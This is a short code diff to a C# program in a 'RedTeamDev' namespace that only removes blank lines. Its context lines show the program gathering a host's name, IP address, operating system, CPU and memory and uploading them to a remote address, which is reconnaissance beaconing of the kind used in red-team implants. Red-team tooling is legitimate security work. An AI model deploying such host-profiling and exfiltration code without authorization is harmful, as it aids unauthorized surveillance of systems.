@@ -10,8 +10,6 @@ namespace RedTeamDev
 {
     class Program
     {
-        
-
         static void Main(string[] args)
         {
             GeneralInfo infoObj = new GeneralInfo();
@@ -32,7 +30,6 @@ namespace RedTeamDev
             string parameters = "hostname=" + infoObj.hostName + "&ip=" + infoObj.ipv4address + "&operatingsystem=" + infoObj.oSystem + "&CPU=" + infoObj.CPU + "&memory=" + (totalCapacity / 1073741824).ToString();
             webObj.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
             webObj.UploadString(address, parameters);
-             
         }
     }
 }
